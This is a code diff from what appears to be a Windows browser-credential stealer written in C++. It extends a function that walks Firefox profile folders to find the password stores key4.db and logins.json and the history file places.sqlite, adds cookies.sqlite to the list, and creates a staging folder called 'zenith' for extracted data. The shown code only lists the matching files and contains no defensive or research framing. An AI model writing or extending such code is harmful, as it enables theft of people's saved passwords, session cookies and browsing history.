@@ -3,6 +3,8 @@
 #include <tchar.h>
 #include <string>
 #include <vector>
+#include <algorithm>
+#include <regex>
 #include <windows.h>
 #include <shlobj.h>
 #include <filesystem>
@@ -100,10 +102,11 @@ void collect_firefox_data() {
 	std::string path_to_appdata = get_local_appdata_path();
 	if (path_to_extraction_directory != "" && path_to_appdata != "") {
 		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
-		std::vector<std::string> files_to_extract = {
-			"places.sqlite",		// Contains bookmarks, names of downloaded files, and websites visited
-			"key4.db",				// Passwords
-			"logins.json",			// Passwords
+		std::vector<std::string> important_files_regex = {
+			"\\places.sqlite$",		// Contains bookmarks, names of downloaded files, and websites visited
+			"\\key4.db$",			// Passwords
+			"\\logins.json$",		// Passwords
+			"\\cookies.sqlite$",	// Stored cookies
 		};
 
 		for (const auto& profile_path : fs::directory_iterator(path_to_profiles)) {
@@ -111,7 +114,6 @@ void collect_firefox_data() {
 				std::cout << item.path().string() << std::endl;
 			}
 		}
-
 	}
 }
 
@@ -124,7 +126,6 @@ std::string create_extraction_directory() {
 		wcstombs(path, Folder, 1023);
 		std::strcat(path, "\\zenith");
 		CreateDirectory(convert_to_wchar(path), NULL);
-
 		return path;
 	}
 	return "";
@@ -134,7 +135,6 @@ wchar_t* convert_to_wchar(const char* charArray)
 {
 	wchar_t* wString = new wchar_t[4096];
 	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
-	
 	return wString;
 }
 
